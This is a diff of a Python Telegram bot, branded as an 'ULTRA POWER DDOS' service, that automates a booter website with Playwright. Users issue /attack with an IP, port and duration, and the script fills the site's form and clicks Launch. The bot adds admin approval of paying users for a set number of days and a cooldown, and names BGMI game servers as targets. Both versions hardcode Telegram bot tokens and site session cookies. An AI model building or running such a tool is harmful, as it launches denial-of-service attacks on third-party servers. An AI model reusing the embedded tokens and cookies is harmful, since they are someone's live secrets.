@@ -1,283 +1,367 @@
-import os
-import json
-import asyncio
-import threading
 import time
+import asyncio
+import json
 from datetime import datetime
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from playwright.async_api import async_playwright
 
-# ==================== CONFIG ====================
-BOT_TOKEN = "8521144614:AAE7Ec2Vvc8Y2sNsa52bgcFZ7ZmLjNQzEoM"
-ADMIN_IDS = [7820814565]
-COOKIE_FILE = "session_cookies.json"
+# ==================== CONFIGURATION ====================
+TELEGRAM_TOKEN = "8521144614:AAEzbN_9CgjnxwR7oXYD0igf92C8KGN8tDo"
+ADMIN_ID = 7820814565
+COOKIE_STRING = "__diamwall=0x1424199230; satellite_auth=27f6f658-66cc-49a5-aca1-fe0e1370ae08; satellite_captcha_verified=HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzkzNjAzMDU2LCJleHAiOjE3NzI4ODAwMDMwNTYsIm5vbmNlIjoiZTE1ZDE3NTRmZmIzZDE0YyJ9.MwIfPA2ywSnctGJLWKPtx5IMgrFdjyNrsDP4EDoVwJ8"
+
+# Website URLs
 WEBSITE_URL = "https://satellitestress.st/attack"
-LOGIN_URL = "https://satellitestress.st/login"
 
 # ==================== GLOBAL VARIABLES ====================
+approved_users = {}
+is_attack_running = False
+attack_end_time = 0
+current_target = ""
 playwright = None
 browser = None
 context = None
 page = None
-cookies_loaded = False
-login_in_progress = False
+bot_ready = False
 
-# ==================== COOKIE FUNCTIONS ====================
-async def save_cookies(ctx):
-    cookies = await ctx.cookies()
-    with open(COOKIE_FILE, 'w') as f:
-        json.dump(cookies, f, indent=2)
-    print("✅ Cookies saved!")
-
-async def load_cookies(ctx):
-    global cookies_loaded
-    try:
-        if os.path.exists(COOKIE_FILE):
-            with open(COOKIE_FILE, 'r') as f:
-                cookies = json.load(f)
-                await ctx.add_cookies(cookies)
-                print("✅ Cookies loaded!")
-                cookies_loaded = True
-                return True
-    except:
-        pass
-    cookies_loaded = False
-    return False
+# ==================== COOKIE PARSING ====================
+def parse_cookie_string(cookie_str):
+    """Convert cookie string to list of dicts for Playwright"""
+    cookies = []
+    for item in cookie_str.split(';'):
+        if '=' in item:
+            key, val = item.strip().split('=', 1)
+            cookies.append({
+                "name": key,
+                "value": val,
+                "domain": ".satellitestress.st",
+                "path": "/",
+                "secure": True,
+                "httpOnly": False,
+                "sameSite": "Lax"
+            })
+    return cookies
 
 # ==================== BROWSER SETUP ====================
-async def init_browser(headless=True):
-    global playwright, browser, context, page
+async def init_browser():
+    """Initialize browser with cookies"""
+    global playwright, browser, context, page, bot_ready
+    
     try:
+        print("🔄 Starting browser...")
         playwright = await async_playwright().start()
-        browser = await playwright.chromium.launch(headless=headless)
+        browser = await playwright.chromium.launch(headless=True)
         context = await browser.new_context()
-        await load_cookies(context)
+        
+        # Add cookies
+        cookies = parse_cookie_string(COOKIE_STRING)
+        await context.add_cookies(cookies)
+        print("✅ Cookies loaded!")
+        
         page = await context.new_page()
-        return True
+        
+        # Test if cookies work
+        await page.goto(WEBSITE_URL, wait_until='networkidle')
+        current_url = page.url
+        if "login" not in current_url:
+            print("✅ Successfully logged in with cookies!")
+            bot_ready = True
+        else:
+            print("❌ Cookies may be expired")
+            bot_ready = False
+            
     except Exception as e:
-        print(f"Browser error: {e}")
-        return False
+        print(f"❌ Browser error: {e}")
+        bot_ready = False
 
 async def close_browser():
+    """Close browser properly"""
     global playwright, browser, context, page
     try:
-        if browser: await browser.close()
-        if playwright: await playwright.stop()
-    except: pass
-    playwright = browser = context = page = None
+        if browser:
+            await browser.close()
+        if playwright:
+            await playwright.stop()
+    except:
+        pass
+
+# ==================== USER FUNCTIONS ====================
+def is_approved(user_id: int):
+    if user_id in approved_users:
+        return time.time() < approved_users[user_id]['expiry_time']
+    return False
+
+def approve_user(user_id: int, days: int):
+    expiry_time = time.time() + (days * 86400)
+    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}
+
+# Auto-approve admin
+approve_user(ADMIN_ID, 36500)
 
 # ==================== BOT COMMANDS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome = """
+⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️
+
+🎯 COMMANDS:
+/Myid - Check User ID
+/attack <ip> <port> <time>
+/approve <user_id> <days>
+/remove <user_id>
+/status - Check bot status
+
+𝐎𝐖𝐍𝐄𝐑 : @RagnarokXop
+    """
+    await update.message.reply_text(welcome)
+
+async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
+    first_name = update.effective_user.first_name
+    username = update.effective_user.username
     
-    status_text = "✅ Ready" if cookies_loaded else "⏳ Not ready"
+    if is_approved(user_id):
+        expiry_time = approved_users[user_id]['expiry_time']
+        approved_days = approved_users[user_id]['approved_days']
+        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
+        
+        remaining = expiry_time - time.time()
+        remaining_days = int(remaining // 86400)
+        remaining_hours = int((remaining % 86400) // 3600)
+        
+        approval_status = f"✅ APPROVED USER\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
+    else:
+        approval_status = "❌ NOT APPROVED"
     
-    text = f"""🤖 **Attack Bot**
+    user_info = f"👤 USER INFO:\n🆔 {user_id}\n📛 {first_name}\n🔗 @{username if username else 'N/A'}\n\n{approval_status}"
+    await update.message.reply_text(user_info)
 
-Status: {status_text}
-
-**Commands:**
-• `/attack <ip> <port> <time>` - Launch attack
-  Example: `/attack 1.1.1.1 80 60`
-• `/status` - Check bot status
-{f"• `/login` - Get login link (admin only)" if is_admin else ""}
-"""
-    await update.message.reply_text(text)
-
-async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Generate remote login link"""
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Admin only.")
+async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Admin only.")
         return
-    
-    global login_in_progress
-    
-    await update.message.reply_text(
-        "🔗 **Generating remote browser link...**\n"
-        "Please wait..."
-    )
-    
-    # Start remote browser
-    login_in_progress = True
-    
-    # Close any existing browser
-    await close_browser()
-    
-    # Start browser in visible mode (remote)
-    playwright = await async_playwright().start()
-    browser = await playwright.chromium.launch(headless=False)
-    context = await browser.new_context()
-    page = await context.new_page()
-    
-    # Go to login page
-    await page.goto(LOGIN_URL)
-    
-    # Generate the remote debugging URL
-    cdp_url = f"http://localhost:9222"
-    
-    # Send instructions
-    keyboard = [[InlineKeyboardButton("🌐 Open Remote Browser", url="about:blank")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        "🔐 **Remote Login Link Generated**\n\n"
-        "1. Click the button below\n"
-        "2. Login manually to the website\n"
-        "3. After login, type /done here\n\n"
-        "⚠️ **Important:** Browser is running on server. Complete login within 5 minutes.",
-        reply_markup=reply_markup
-    )
-
-async def done(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Complete login and save cookies"""
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
+        
+    if len(context.args) != 2:
+        await update.message.reply_text("Usage: /approve <user_id> <days>")
         return
-    
-    global cookies_loaded, login_in_progress
-    
+
     try:
-        # Save cookies
-        await save_cookies(context)
-        cookies_loaded = True
-        login_in_progress = False
+        user_id = int(context.args[0])
+        days = int(context.args[1])
         
-        # Switch to headless mode
-        await close_browser()
-        await init_browser(headless=True)
+        if days < 1 or days > 30:
+            await update.message.reply_text("❌ Days: 1-30 only.")
+            return
+            
+        approve_user(user_id, days)
+        expiry_time = approved_users[user_id]['expiry_time']
+        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
         
-        await update.message.reply_text(
-            "✅ **Login Successful!**\n\n"
-            "Bot is now ready.\n"
-            "Users can use /attack command."
-        )
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"✅ USER APPROVED!\n🆔 {user_id}\n📅 {days} days\n⏰ {expiry_str}")
+        
+    except ValueError:
+        await update.message.reply_text("❌ Invalid numbers.")
 
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack command"""
-    global page, cookies_loaded
-    
-    if not cookies_loaded or page is None:
-        await update.message.reply_text("⏳ Bot not ready. Admin needs to login first.")
+async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Only admin can remove users.")
         return
-    
-    args = context.args
-    if len(args) != 3:
-        await update.message.reply_text("❌ Use: /attack <ip> <port> <time>")
+        
+    if len(context.args) != 1:
+        await update.message.reply_text("Usage: /remove <user_id>")
         return
-    
-    ip, port_str, time_str = args
-    
+
     try:
-        port = int(port_str)
-        duration = int(time_str)
-        if port < 1 or port > 65535 or duration < 10 or duration > 300:
-            raise ValueError
-    except:
-        await update.message.reply_text("❌ Invalid port or time.")
-        return
-    
-    msg = await update.message.reply_text(f"🔄 Launching attack on `{ip}:{port}` for {duration}s...")
-    
-    def run_attack():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        user_id = int(context.args[0])
         
-        async def perform():
-            nonlocal msg
-            try:
-                await page.goto(WEBSITE_URL, wait_until='networkidle')
-                await page.wait_for_timeout(2000)
-                
-                inputs = await page.query_selector_all('input[type="text"]')
-                visible = []
-                for inp in inputs:
-                    if await inp.is_visible():
-                        visible.append(inp)
-                
-                if len(visible) >= 3:
-                    await visible[0].fill(''); await visible[0].fill(ip)
-                    await visible[1].fill(''); await visible[1].fill(str(port))
-                    await visible[2].fill(''); await visible[2].fill(str(duration))
-                    
-                    launch_btn = await page.query_selector('button:has-text("Launch")')
-                    if launch_btn:
-                        await launch_btn.click()
-                        await page.wait_for_timeout(2000)
-                        await msg.edit_text(f"✅ **Attack Launched!**\n`{ip}:{port}` for {duration}s")
-                    else:
-                        await msg.edit_text("❌ Launch button not found")
-                else:
-                    await msg.edit_text(f"❌ Only {len(visible)} inputs found")
-            except Exception as e:
-                await msg.edit_text(f"❌ Attack error: {e}")
+        if user_id == ADMIN_ID:
+            await update.message.reply_text("❌ Cannot remove admin.")
+            return
+            
+        if user_id in approved_users:
+            del approved_users[user_id]
+            await update.message.reply_text(f"✅ USER REMOVED!\n🆔 {user_id}")
+        else:
+            await update.message.reply_text("❌ User not found.")
         
-        try:
-            loop.run_until_complete(perform())
-        finally:
-            loop.close()
-    
-    threading.Thread(target=run_attack).start()
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if cookies_loaded:
-        await update.message.reply_text("✅ Bot is ready. Cookies loaded.")
+    if bot_ready:
+        await update.message.reply_text("✅ Bot is ready. Cookies working.")
     else:
-        await update.message.reply_text("⏳ Bot not ready. Admin needs to /login first.")
+        await update.message.reply_text("❌ Bot not ready. Check logs.")
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global is_attack_running, attack_end_time, current_target, page, bot_ready
+    
+    if not bot_ready or page is None:
+        await update.message.reply_text("❌ Bot not ready. Check logs.")
+        return
+    
+    if not is_approved(update.effective_user.id):
+        await update.message.reply_text("❌ Not approved.")
+        return
+    
+    if is_attack_running:
+        remaining_time = attack_end_time - time.time()
+        if remaining_time > 0:
+            mins = int(remaining_time // 60)
+            secs = int(remaining_time % 60)
+            
+            sent_msg = await update.message.reply_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
+            
+            while remaining_time > 0:
+                await asyncio.sleep(5)
+                remaining_time = attack_end_time - time.time()
+                if remaining_time <= 0:
+                    break
+                    
+                mins = int(remaining_time // 60)
+                secs = int(remaining_time % 60)
+                
+                try:
+                    await sent_msg.edit_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
+                except:
+                    break
+            
+            await update.message.reply_text("✅ Cooldown ended!")
+        return
+        
+    if len(context.args) != 3:
+        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
+        return
+
+    try:
+        ip = context.args[0]
+        port = context.args[1]
+        time_int = int(context.args[2])
+        
+        if time_int < 1 or time_int > 300:
+            await update.message.reply_text("❌ Time: 1-300 seconds")
+            return
+            
+    except ValueError:
+        await update.message.reply_text("❌ Invalid time. Time must be a number.")
+        return
+
+    is_attack_running = True
+    attack_end_time = time.time() + time_int
+    current_target = f"{ip}:{port}"
+    
+    attack_msg = f"""
+⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️
+
+🚀 ATTACK BY: @RagnarokXop
+🎯 TARGET: {ip}
+🔌 PORT: {port}
+⏰ TIME: {time_int}s
+
+🌎 GAME: BGMI
+    """
+    await update.message.reply_text(attack_msg)
+    
+    asyncio.create_task(execute_attack(update, ip, port, time_int))
+    
+    await asyncio.sleep(10)
+    await update.message.reply_text("🔥 Attack Processing Start 🔥")
+
+async def execute_attack(update, ip, port, duration):
+    global is_attack_running, current_target, page
+    
+    try:
+        # Go to attack page
+        await page.goto(WEBSITE_URL, wait_until='networkidle')
+        await page.wait_for_timeout(2000)
+        
+        # Find input fields
+        inputs = await page.query_selector_all('input[type="text"]')
+        visible_inputs = []
+        
+        for inp in inputs:
+            if await inp.is_visible():
+                visible_inputs.append(inp)
+        
+        if len(visible_inputs) >= 3:
+            # Fill IP
+            await visible_inputs[0].fill('')
+            await visible_inputs[0].fill(ip)
+            
+            # Fill Port
+            await visible_inputs[1].fill('')
+            await visible_inputs[1].fill(str(port))
+            
+            # Fill Time
+            await visible_inputs[2].fill('')
+            await visible_inputs[2].fill(str(duration))
+            
+            # Find and click launch button
+            launch_btn = await page.query_selector('button:has-text("Launch")')
+            if launch_btn:
+                await launch_btn.click()
+                await page.wait_for_timeout(2000)
+                
+                await update.message.reply_text("🔥 Attack sent successfully!")
+            else:
+                await update.message.reply_text("❌ Launch button not found")
+        else:
+            await update.message.reply_text(f"❌ Only {len(visible_inputs)} inputs found")
+        
+        await asyncio.sleep(duration)
+        await update.message.reply_text("✅ ATTACK COMPLETED! 🎯")
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Attack error: {e}")
+    
+    finally:
+        is_attack_running = False
+        current_target = ""
 
 # ==================== MAIN ====================
 async def main():
-    print("="*60)
-    print("🤖 PROFESSIONAL ATTACK BOT")
-    print("="*60)
-    print("Initializing...")
+    print("""
+    ╔══════════════════════════════════════════════╗
+    ║    ⚡ MRX COOKIE BOT STARTING...             ║
+    ║    Commands: /attack, /Myid, /approve       ║
+    ║    /remove, /status                         ║
+    ║    Owner: @RagnarokXop                       ║
+    ╚══════════════════════════════════════════════╝
+    """)
     
-    # Try to load cookies on startup
-    try:
-        test = await async_playwright().start()
-        test_browser = await test.chromium.launch(headless=True)
-        test_context = await test_browser.new_context()
-        
-        if await load_cookies(test_context):
-            global cookies_loaded, context, browser, playwright, page
-            cookies_loaded = True
-            context = test_context
-            browser = test_browser
-            playwright = test
-            page = await context.new_page()
-            print("✅ Cookies loaded automatically!")
-        else:
-            await test_browser.close()
-            await test.stop()
-            print("📁 No cookies found. Admin must login with /login")
-    except Exception as e:
-        print(f"⚠️ Startup note: {e}")
+    # Initialize browser
+    await init_browser()
     
-    print("="*60)
-    print("Bot is running!")
-    print("Admin: /login → /done")
-    print("Users: /attack ip port time")
-    print("="*60)
+    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("Myid", Myid))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(CommandHandler("remove", remove))
+    application.add_handler(CommandHandler("status", status))
+    application.add_handler(CommandHandler("attack", attack))
+    
+    print("✅ Bot started with cookies!")
+    
+    await application.run_polling(
+        poll_interval=1.0,
+        timeout=30,
+        drop_pending_updates=True,
+        allowed_updates=Update.ALL_TYPES
+    )
 
-def run_bot():
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("login", login))
-    app.add_handler(CommandHandler("done", done))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("status", status))
-    
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(main())
-    
-    print("🤖 Bot polling started...")
-    app.run_polling()
+def run():
+    while True:
+        try:
+            asyncio.run(main())
+        except KeyboardInterrupt:
+            print("\n🛑 Bot stopped")
+            break
+        except Exception as e:
+            print(f"⚠️ Bot crashed: {e}")
+            print("🔄 Restarting in 10 seconds...")
+            time.sleep(10)
+            continue
 
 if __name__ == "__main__":
-    run_bot()
+    run()
